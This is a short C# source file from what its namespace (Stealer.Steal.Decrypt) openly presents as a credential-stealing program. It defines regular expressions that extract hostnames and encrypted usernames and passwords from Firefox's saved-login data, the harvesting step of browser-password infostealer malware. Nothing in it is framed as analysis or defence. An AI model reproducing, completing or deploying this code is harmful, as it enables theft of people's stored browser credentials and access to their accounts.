using System.Text.RegularExpressions;

namespace Stealer.Steal.Decrypt;

internal class FfRegex
{
	public static readonly Regex Hostname = new Regex("\"hostname\":\"([^\"]+)\"");

	public static readonly Regex Username = new Regex("\"encryptedUsername\":\"([^\"]+)\"");

	public static readonly Regex Password = new Regex("\"encryptedPassword\":\"([^\"]+)\"");
}
